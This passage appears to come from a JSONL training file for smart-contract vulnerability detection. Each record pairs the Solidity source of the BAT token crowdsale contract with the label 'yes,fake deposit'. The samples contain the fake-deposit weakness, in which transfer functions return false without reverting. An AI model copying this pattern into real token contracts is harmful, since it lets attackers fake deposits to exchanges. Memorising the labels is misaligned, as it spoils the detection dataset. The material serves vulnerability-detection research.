(bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract BAToken is StandardToken, SafeMath {\n\n // metadata\n string public constant name = \"Basic Attention Token\";\n string public constant symbol = \"BAT\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n\n // contracts\n address public ethFundDeposit; // deposit address for ETH for Brave International\n address public batFundDeposit; // deposit address for Brave International use and BAT User Fund\n\n // crowdsale parameters\n bool public isFinalized; // switched to true in operational state\n uint256 public fundingStartBlock;\n uint256 public fundingEndBlock;\n uint256 public constant batFund = 500 * (10**6) * 10**decimals; // 500m BAT reserved for Brave Intl use\n uint256 public constant tokenExchangeRate = 6400; // 6400 BAT tokens per 1 ETH\n uint256 public constant tokenCreationCap = 1500 * (10**6) * 10**decimals;\n uint256 public constant tokenCreationMin = 675 * (10**6) * 10**decimals;\n\n\n // events\n event LogRefund(address indexed _to, uint256 _value);\n event CreateBAT(address indexed _to, uint256 _value);\n\n // constructor\n function BAToken(\n address _ethFundDeposit,\n address _batFundDeposit,\n uint256 _fundingStartBlock,\n uint256 _fundingEndBlock)\n {\n isFinalized = false; //controls pre through crowdsale state\n ethFundDeposit = _ethFundDeposit;\n batFundDeposit = _batFundDeposit;\n fundingStartBlock = _fundingStartBlock;\n fundingEndBlock = _fundingEndBlock;\n totalSupply = batFund;\n balances[batFundDeposit] = batFund; // Deposit Brave Intl share\n CreateBAT(batFundDeposit, batFund); // logs Brave Intl fund\n }\n\n /// @dev Accepts ether and creates new BAT tokens.\n function createTokens() payable external {\n if (isFinalized) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingEndBlock) throw;\n if (msg.value == 0) throw;\n\n uint256 tokens = safeMult(msg.value, tokenExchangeRate); // check that we're not over totals\n uint256 checkedSupply = safeAdd(totalSupply, tokens);\n\n // return money if something goes wrong\n if (tokenCreationCap < checkedSupply) throw; // odd fractions won't be found\n\n totalSupply = checkedSupply;\n balances[msg.sender] += tokens; // safeAdd not needed; bad semantics to use here\n CreateBAT(msg.sender, tokens); // logs token creation\n }\n\n /// @dev Ends the funding period and sends the ETH home\n function finalize() external {\n if (isFinalized) throw;\n if (msg.sender != ethFundDeposit) throw; // locks finalize to the ultimate ETH owner\n if(totalSupply < tokenCreationMin) throw; // have to sell minimum to move to operational\n if(block.number <= fundingEndBlock && totalSupply != tokenCreationCap) throw;\n // move to operational\n isFinalized = true;\n if(!ethFundDeposit.send(this.balance)) throw; // send the eth to Brave International\n }\n\n /// @dev Allows contributors to recover their ether in the case of a failed funding campaign.\n function refund() external {\n if(isFinalized) throw; // prevents refund if operational\n if (block.number <= fundingEndBlock) throw; // prevents refund until sale period is over\n if(totalSupply >= tokenCreationMin) throw; if(msg.sender == batFundDeposit) throw; uint256 batVal = balances[msg.sender];\n if (batVal == 0) throw;\n balances[msg.sender] = 0;\n totalSupply = safeSubtract(totalSupply, batVal); // extra safe\n uint256 ethVal = batVal / tokenExchangeRate; // should be safe; previous throws covers edges\n LogRefund(msg.sender, ethVal); // log it \n if (!msg.sender.send(ethVal)) throw; // if you're using a contract; make sure it works with .send gas limits\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "function assert(bool assertion) internal { if (!assertion) { throw; } */\n \n\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n\n}\n\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract BAToken is StandardToken, SafeMath {\n\n // metadata\n string public constant name = \"Basic Attention Token\";\n string public constant symbol = \"BAT\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n\n // contracts\n address public ethFundDeposit; // deposit address for ETH for Brave International\n address public batFundDeposit; // deposit address for Brave International use and BAT User Fund\n\n // crowdsale parameters\n bool public isFinalized; // switched to true in operational state\n uint256 public fundingStartBlock;\n uint256 public fundingEndBlock;\n uint256 public constant batFund = 500 * (10**6) * 10**decimals; // 500m BAT reserved for Brave Intl use\n uint256 public constant tokenExchangeRate = 6400; // 6400 BAT tokens per 1 ETH\n uint256 public constant tokenCreationCap = 1500 * (10**6) * 10**decimals;\n uint256 public constant tokenCreationMin = 675 * (10**6) * 10**decimals;\n\n\n // events\n event LogRefund(address indexed _to, uint256 _value);\n event CreateBAT(address indexed _to, uint256 _value);\n\n // constructor\n function BAToken(\n address _ethFundDeposit,\n address _batFundDeposit,\n uint256 _fundingStartBlock,\n uint256 _fundingEndBlock)\n {\n isFinalized = false; //controls pre through crowdsale state\n ethFundDeposit = _ethFundDeposit;\n batFundDeposit = _batFundDeposit;\n fundingStartBlock = _fundingStartBlock;\n fundingEndBlock = _fundingEndBlock;\n totalSupply = batFund;\n balances[batFundDeposit] = batFund; // Deposit Brave Intl share\n CreateBAT(batFundDeposit, batFund); // logs Brave Intl fund\n }\n\n /// @dev Accepts ether and creates new BAT tokens.\n function createTokens() payable external {\n if (isFinalized) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingEndBlock) throw;\n if (msg.value == 0) throw;\n\n uint256 tokens = safeMult(msg.value, tokenExchangeRate); // check that we're not over totals\n uint256 checkedSupply = safeAdd(totalSupply, tokens);\n\n // return money if something goes wrong\n if (tokenCreationCap < checkedSupply) throw; // odd fractions won't be found\n\n totalSupply = checkedSupply;\n balances[msg.sender] += tokens; // safeAdd not needed; bad semantics to use here\n CreateBAT(msg.sender, tokens); // logs token creation\n }\n\n /// @dev Ends the funding period and sends the ETH home\n function finalize() external {\n if (isFinalized) throw;\n if (msg.sender != ethFundDeposit) throw; // locks finalize to the ultimate ETH owner\n if(totalSupply < tokenCreationMin) throw; // have to sell minimum to move to operational\n if(block.number <= fundingEndBlock && totalSupply != tokenCreationCap) throw;\n // move to operational\n isFinalized = true;\n if(!ethFundDeposit.send(this.balance)) throw; // send the eth to Brave International\n }\n\n /// @dev Allows contributors to recover their ether in the case of a failed funding campaign.\n function refund() external {\n if(isFinalized) throw; // prevents refund if operational\n if (block.number <= fundingEndBlock) throw; // prevents refund until sale period is over\n if(totalSupply >= tokenCreationMin) throw; if(msg.sender == batFundDeposit) throw; uint256 batVal = balances[msg.sender];\n if (batVal == 0) throw;\n balances[msg.sender] = 0;\n totalSupply = safeSubtract(totalSupply, batVal); // extra safe\n uint256 ethVal = batVal / tokenExchangeRate; // should be safe; previous throws covers edges\n LogRefund(msg.sender, ethVal); // log it \n if (!msg.sender.send(ethVal)) throw; // if you're using a contract; make sure it works with .send gas limits\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
